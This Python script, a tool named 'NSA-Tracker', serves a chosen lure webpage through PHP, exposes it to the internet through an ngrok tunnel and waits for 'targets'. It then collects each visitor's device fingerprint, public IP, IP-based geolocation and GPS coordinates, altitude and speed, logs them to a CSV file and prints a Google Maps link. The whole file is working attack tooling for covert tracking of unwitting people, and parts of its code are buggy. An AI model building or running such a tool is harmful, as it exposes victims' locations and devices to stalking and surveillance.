#! /usr/bin/env python3
## Released under MIT License
# Creator: Marius Sheppard

from ast import Sub
import os as OS
import time as Time
import json as JSON
import argparse as ArgParse
from urllib.request import Request
import requests as Req
import subprocess as Subb
import csv as CSV

# VARIABLES #
R = '\033[31m' # Red
G = '\033[32m' # Green
C = '\033[36m' # Cyan
W = '\033[0m'  # white 
Version = '0.0.0'
WebPage = 'NULL'
Info    = ''
Results = ''
WAN     = ''
Rows    = []

with open('./Logs/Version.txt', 'r') as LocalVersion:
  Version = LocalVersion.read().strip() 

Parser = ArgParse.ArgumentParser()
Parser.add_argument('-t','--tun',help='Specify Tunnel Mode [manual] [auto=ngrok] ', default = "auto")
Parser.add_argument('-s','--site',help='Specify Site Template [name] ', default = None)
Parser.add_argument('-p','--port',help='Specify Port [number] WITH ROOT', default = "8080")
Args = Parser.parse_args()
Tunnel_Mode = Args.tun

# FUNCTIONS #
def DrawBanner():
  OS.system('clear')
  print(G+
  r'''
      | \ | |/ ____|  /\    
      |  \| | (___   /  \   
      | . ` |\___ \ / /\ \  
      | |\  |____) / ____ \ 
      |_| \_|_____/_/    \_\
 '''+W)
  print('\n' + G + '[>] ' + C + 'Created By: ' + W + 'Marius Sheppard')
  print(G + '[>] ' + C + 'Version: ' + W + Version + '\n')



def CheckVersion():
  print(G + '[+] ' + C + 'Checking Updates... ', end='')
  try:
    VersionRequest = Req.get('https://raw.githubusercontent.com/Marius-Sheppard/NSA-Tracker/master/Logs/Version.txt')
 
    if(VersionRequest.status_code == 200):
      CurrentVersion = VersionRequest.text.strip()
      if(Version == CurrentVersion):
        print(C + '[' + G + 'No Updates Found' + C + '] ' + '\n')
      else:
        print(C + '[' + G + 'Updates Available: {}'.format(CurrentVersion) + C + '] ' + '\n')
    else:
      print(C + '[' + R + 'Request Failed With Status: {}'.format(VersionRequest.status_code) + C + '] ' + '\n')
  except Exception as E:
    print('\n' + R + '[-] ' + C + 'Exception Occured: ' + W + str(E))



def TunnelSelector():
  global WAN

  if(Tunnel_Mode == None):
    print(G + '[+] ' + C + 'Invalid Tunnel Mode' + W + '\n')
  elif(Tunnel_Mode == 'manual' or Tunnel_Mode == 'Manual'):
    print(G + '[+] ' + C + 'Start Tunnel Service Manually (e.g. ./ngrok http' + Args.port + ')' + W + '\n')
  elif(Tunnel_Mode == 'auto' or Tunnel_Mode == 'Auto'):
    print(G + '[+] ' + C + 'Starting tunnel service automatically' + W + '\n')

    Ngrok = Subb.Popen(['ngrok', 'http', Args.port], stdout = Subb.PIPE, stderr = Subb.PIPE)
    for i in range(0,9):
      try:
        URL = "http://127.0.0.1:404" + str(i) + "/api/tunnels"
        TunnelURL = Req.get(URL, timeout = 5, verify = False, allow_redirects = True)
        if(TunnelURL.status_code == 200):
          break
      except Exception as E:
        print(R + '[-] ' + C + 'Failed To Start Tunnel Service... Retrying...' + W + '\n')
 
      #print(R + '[-] ' + C + 'Failed To Start Tunnel Service, Retrying...' + W + '\n')
 
    WAN = "https://" + (JSON.loads(TunnelURL.text)['tunnels'][0]['public_url'].split("https://")[1])
  else:
    print(R + '[+] ' + C + 'Invalid Tunnel Mode Selected' + W + '\n')
    exit(0)



def TemplateSelector():
  global Info, WebPage, Results
  if(Args.site != None):
    WebPage = Args.site
  else:
    print(G + '[+] ' + C + 'Select Website:' + W + '\n')
    Info = './Output/Info.txt'
    Results = './Output/Results.txt'
    Pages = []
    for File in OS.listdir('./Webpages/'):
      if(OS.path.isdir('./Webpages/' + File)):
        Pages.append(File)
    
    PageIndex = 0
    for Page in Pages:
      print(G + '   [' + str(PageIndex) + '] ' + C + Page + W + '\n')
      PageIndex+=1

    Selected = input(G + '[>] ' + W) 
    if(Selected.isdigit()):
      Selected = int(Selected)
      if(Selected >= 0 and Selected < len(Pages)):
        WebPage = Pages[Selected]
        print('\n' + G + '[+] ' + C + 'Loading: ' + WebPage + W)
      else:
        print(R + '[-] ' + C + 'Invalid Selection' + W + '\n')
        TemplateSelector()
    else:
      print(R + '[-] ' + C + 'Invalid Selection' + W + '\n')
    TemplateSelector()




def ServerSpawner():
  global WAN
  print('\n' + G + '[+] ' + C + 'Starting Server... ' + W, end='')
  OS.system(" kill -9 $( ps -ef | grep php |  awk '{print $2}' )")
  with open('./Logs/PHP.log','w') as PHP_LOG:
    Subb.Popen(['php', '-S', '0.0.0.0:' + Args.port, '-t','./Webpages/{}/'.format(WebPage)], stdout = PHP_LOG, stderr = PHP_LOG)
    Time.sleep(3)
    try:
      PHP_Request = Req.get('http://0.0.0.0:' + Args.port + '/index.html')
      if(PHP_Request.status_code == 200):
        print(C + '[' + G + 'Server running!' + C + '] ' + W)
        print(G + '[+][LAN] ' + W + 'http://localhost:' + Args.port + '/index.html' + '\n')
        if(Tunnel_Mode == 'auto' or Tunnel_Mode == 'Auto'):
          print(G + '[+][WAN] ' + W + WAN + '\n')
      else:
        print(C + '[' + R + 'Request failed with code:{}'.format(PHP_Request.status_code) + C + '] ' + W)
    except Req.ConnectionError as E: 
      print(C + '[' + R + 'Server Start Failed: ' + str(E) + C + '] ' + W)
      exit()
    Main()



def Waiter():
  global Info, Results
  Done = False
  while True:
    Time.sleep(3)
    Size = OS.path.getsize(Info)
    Size2 = OS.path.getsize(Results)
    if(Size == 0 and Size2 == 0 and Done == False):
      print(G + '\n[+] ' + C + 'Waiting For Targets...' + W)
      Done = True
    elif(Size > 0 or Size2 > 0):
      Main()



def Quit():
  global Info
  try:
    DrawBanner()
    CheckVersion()
    TunnelSelector()
    TemplateSelector()
    ServerSpawner()

  except KeyboardInterrupt as E:
    print('\n' + R + '[!] ' + C + 'Keyboard Interrupt.' + W)
    exit()


 

# @todo: Only write original targets!
def WriteCSV():
  global Rows
  with open('./Output/Results.csv', 'a') as CSV_File:
    Writer = CSV.writer(CSV_File)
    Writer.writerow(Rows)
    print(G + '[+] ' + C + 'New Entry Added in Database:' + W + OS.getcwd() + '/Output/Results.csv')



def Main():
  global Rows, Info, Results
  Rows = [ ];
  try:
    with open (Info, 'r') as Info_File:
      Info_File = Info_File.read()
      JSON_Data = JSON.loads(Info_File)
      for Value in JSON_Data['dev']:
        VAR_OS       = Value['os'] or "N/A"
        VAR_Platform = Value['platform'] or  "N/A"
        VAR_Lang     = Value['lang'] or  "N/A"
        VAR_On       = Value['on'] or  "N/A"
        VAR_Prod     = Value['prod'] or  "N/A"
        VAR_Cores    = Value['cores'] or  "N/A"
        VAR_RAM      = Value['ram'] or  "N/A"
        VAR_Vendor   = Value['vendor'] or  "N/A"
        VAR_Render   = Value['render'] or  "N/A"
        VAR_Res      = (Value['wd'] or  "N/A") + ' x ' + (Value['ht'] or  "N/A")
        VAR_Browser  = Value['browser'] or  "N/A"
        VAR_IP       = Value['ip'] or  "N/A"

        Rows.append(VAR_OS)
        Rows.append(VAR_Platform)
        Rows.append(VAR_Lang)
        Rows.append(VAR_On)
        Rows.append(VAR_Prod)
        Rows.append(VAR_Cores)
        Rows.append(VAR_RAM)
        Rows.append(VAR_Vendor)
        Rows.append(VAR_Render)
        Rows.append(VAR_Res)
        Rows.append(VAR_Browser)
        Rows.append(VAR_IP)

        print(G + '\n\n[+] ' + C + 'Device Detected' + W)
        print(G + '[+] ' + C + 'OS         : ' + W + VAR_OS)
        print(G + '[+] ' + C + 'Language   : ' + W + VAR_Lang)
        print(G + '[+] ' + C + 'Status     : ' + W + VAR_On)
        print(G + '[+] ' + C + 'Product    : ' + W + VAR_Prod)
        print(G + '[+] ' + C + 'Platform   : ' + W + VAR_Platform)
        print(G + '[+] ' + C + 'CPU Cores  : ' + W + VAR_Cores)
        print(G + '[+] ' + C + 'RAM        : ' + W + VAR_RAM)
        print(G + '[+] ' + C + 'GPU Vendor : ' + W + VAR_Vendor)
        print(G + '[+] ' + C + 'GPU        : ' + W + VAR_Render)
        print(G + '[+] ' + C + 'Resolution : ' + W + VAR_Res)
        print(G + '[+] ' + C + 'Browser    : ' + W + VAR_Browser)
        print(G + '[+] ' + C + 'Public IP  : ' + W + VAR_IP)

        Request = Req.get('http://ipwhois.app/json/'.format(VAR_IP), timeout=50)
        
        if(Request.status_code == 200):
          Data = JSON.loads(Request.text)
          VAR_IPv       = str(Data['ip'])  or 'N/A'
          VAR_HostName  = str(Data['continent']) or 'N/A'
          VAR_City      = str(Data['city']) or 'N/A'
          VAR_Region    = str(Data['region']) or 'N/A' 
          VAR_Country   = str(Data['country']) or 'N/A'
          VAR_Org       = str(Data['org']) or 'N/A'
          VAR_ASN       = str(Data['asn']) or 'N/A'
          Rows.append(VAR_IPv)
          Rows.append(VAR_HostName)
          Rows.append(VAR_City)
          Rows.append(VAR_Region)
          Rows.append(VAR_Country)
          Rows.append(VAR_Org)
          Rows.append(VAR_ASN)
          Rows.append(VAR_Org)
          Rows.append(VAR_ASN)

          print(G + '[+] ' + C + 'IPv4       : ' + W + VAR_IPv)
          print(G + '[+] ' + C + 'Continent  : ' + W + VAR_HostName)
          print(G + '[+] ' + C + 'City       : ' + W + VAR_City)
          print(G + '[+] ' + C + 'Region     : ' + W + VAR_Region)
          print(G + '[+] ' + C + 'Country    : ' + W + VAR_Country)
          print(G + '[+] ' + C + 'ISP        : ' + W + VAR_Org)
          print(G + '[+] ' + C + 'ASN        : ' + W + VAR_ASN)

    with open (Results, 'r') as Results_File:
      Results_File = Results_File.read()
      JSON_Data = JSON.loads(Results_File)
      for Value in JSON_Data['dev']:
          VAR_Lat      = ((Value['lat']) or 'N/A') + ' deg'
          VAR_Lon      = ((Value['lon']) or 'N/A') + ' deg'
          VAR_Acc      = ((Value['acc']) or 'N/A') + ' m'
          VAR_Alt      = ((Value['alt']) or 'N/A') + ' m'
          VAR_Dir      = ((Value['dir']) or 'N/A') + ' deg'
          VAR_Spd      = ((Value['spd']) or 'N/A') + ' deg'
          Rows.append(VAR_Lat)
          Rows.append(VAR_Lon)
          Rows.append(VAR_Acc)
          Rows.append(VAR_Alt)
          Rows.append(VAR_Dir)
          Rows.append(VAR_Spd)
          WriteCSV()
          print(G + '[+] ' + C + 'Latitude   : ' + W + VAR_Lat)
          print(G + '[+] ' + C + 'Longitude  : ' + W + VAR_Lon)
          print(G + '[+] ' + C + 'Momentum   : ' + W + VAR_Acc)
          print(G + '[+] ' + C + 'Altitude   : ' + W + VAR_Alt)
          print(G + '[+] ' + C + 'Direction  : ' + W + VAR_Dir)
          print(G + '[+] ' + C + 'Speed      : ' + W + VAR_Spd)
          print('\n' + G + '[+] ' + C + 'Google Maps:  ' + W + 'https://www.google.com/maps/place/' + VAR_Lat.strip(' deg') + '+' + VAR_Lon.strip(' deg'))

    WriteCSV()

  except ValueError:
    pass 

  OS.system("rm -rf ./Output/Info.txt")
  OS.system("rm -rf ./Output/Results.txt")
  OS.system("touch ./Output/Results.txt")  
  OS.system("touch ./Output/Info.txt")      
  Waiter()

Quit()